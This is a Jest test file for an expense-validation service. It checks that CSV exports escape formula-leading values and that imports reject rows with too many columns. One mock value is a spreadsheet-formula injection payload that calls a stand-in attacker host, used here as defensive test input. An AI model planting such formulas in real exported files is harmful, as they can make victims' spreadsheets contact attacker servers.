import { ExpenseValidationService } from '@transactions/expense-validation.service';

describe('ExpenseValidationService CSV exports', () => {
  it('neutralizes spreadsheet formulas in exported rule values', async () => {
    const prisma = {
      expenseValidationRule: {
        findMany: jest.fn().mockResolvedValue([
          {
            entry: '=WEBSERVICE("https://attacker.test")',
            secondaryCategory: {
              name: '+Secondary',
              parentCategory: {
                name: '@Primary',
              },
            },
          },
        ]),
      },
    } as unknown as ConstructorParameters<typeof ExpenseValidationService>[0];
    const categoriesService = {
      findAll: jest.fn(),
    } as unknown as ConstructorParameters<typeof ExpenseValidationService>[1];
    const service = new ExpenseValidationService(prisma, categoriesService);

    const csv = await service.exportRulesCsv('owner-1');

    expect(csv).toBe(
      [
        'entry,primary,secondary',
        `"'=WEBSERVICE(""https://attacker.test"")","'@Primary","'+Secondary"`,
      ].join('\n'),
    );
  });

  it('neutralizes spreadsheet formulas in exported hierarchy values', async () => {
    const prisma = {
      expenseValidationRule: {
        findMany: jest.fn(),
      },
    } as unknown as ConstructorParameters<typeof ExpenseValidationService>[0];
    const categoriesService = {
      findAll: jest.fn().mockResolvedValue([
        {
          id: 'primary-1',
          name: '-Primary',
          type: 'EXPENSE',
          archivedAt: null,
          parentCategoryId: null,
          order: 1,
        },
        {
          id: 'secondary-1',
          name: '=Secondary',
          type: 'EXPENSE',
          archivedAt: null,
          parentCategoryId: 'primary-1',
          order: 2,
        },
      ]),
    } as unknown as ConstructorParameters<typeof ExpenseValidationService>[1];
    const service = new ExpenseValidationService(prisma, categoriesService);

    const csv = await service.exportHierarchyCsv('owner-1');

    expect(csv).toBe(
      [
        'level,primary,secondary,primaryOrder,secondaryOrder',
        `"SECONDARY","'-Primary","'=Secondary","1","2"`,
      ].join('\n'),
    );
  });

  it('rejects import CSV rows with more columns than the header row', async () => {
    const prisma = {
      $transaction: jest.fn(),
      expenseValidationRule: {
        findMany: jest.fn(),
      },
    } as unknown as ConstructorParameters<typeof ExpenseValidationService>[0];
    const categoriesService = {
      findAll: jest.fn(),
    } as unknown as ConstructorParameters<typeof ExpenseValidationService>[1];
    const service = new ExpenseValidationService(prisma, categoriesService);

    await expect(
      service.importRulesCsv('owner-1', {
        buffer: Buffer.from(
          ['entry,primary,secondary', 'coffee,Food,Snacks,unexpected'].join(
            '\n',
          ),
        ),
      }),
    ).rejects.toThrow('CSV row 2 has more columns than the header row.');
  });
});
